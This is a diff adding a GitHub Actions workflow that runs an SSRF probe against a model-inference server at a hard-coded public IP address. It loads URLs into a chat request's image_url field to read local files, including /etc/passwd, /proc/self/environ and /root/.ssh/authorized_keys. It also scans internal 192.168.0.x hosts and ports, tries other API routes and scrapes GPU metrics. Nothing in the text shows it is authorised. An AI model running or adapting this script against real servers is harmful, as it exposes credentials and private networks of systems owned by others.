@@ -1,0 +1,30 @@
+name: ul5685ssrf
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  s:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: ssrf
+        run: |
+          set +e
+          B=http://123.184.7.135:8000
+          t(){ echo "-- $1"; curl -s -m 25 -X POST -H 'Content-Type: application/json' -d "{\"model\":\"qwen3.8-27b\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"image_url\",\"image_url\":{\"url\":\"$1\"}},{\"type\":\"text\",\"text\":\"x\"}]}],\"max_tokens\":2}" $B/invocations -w '\n   code=%{http_code}\n' | head -c 400; echo; }
+          echo "=== file scheme"
+          t "file:///etc/passwd"
+          t "file:///etc/hostname"
+          t "file:///proc/self/environ"
+          t "file:///root/.ssh/authorized_keys"
+          echo "=== public image control"
+          t "https://www.baidu.com/img/flexible/logo/pc/result.png"
+          echo "=== lan ssrf"
+          for u in http://127.0.0.1:8000/metrics http://127.0.0.1:22/ http://192.168.0.24:18086/api/health http://192.168.0.24:18080/api/health http://192.168.0.24:9400/metrics http://192.168.0.28:781/ http://192.168.0.30:9400/metrics http://192.168.0.31:22/ http://192.168.0.1/ http://192.168.0.20:18086/ http://192.168.0.29:18086/ http://192.168.0.23:22/; do t "$u"; done
+          echo "=== other openai routes"
+          for p in /v1/messages /v1/responses /inference/v1/generate /v1/embeddings; do
+            echo "-- $p"; curl -s -m 12 -X POST -H 'Content-Type: application/json' -d '{"model":"qwen3.8-27b","messages":[{"role":"user","content":"hi"}],"max_tokens":2,"prompt":"hi","input":"hi"}' $B$p -w '\n   code=%{http_code}\n' | head -c 260; echo
+          done
+          echo "=== metrics gpu"
+          curl -s -m 10 $B/metrics | grep -E 'gpu_cache_usage|num_gpu_blocks|model_name|num_requests_running|engine' | head -10
+          echo DONE
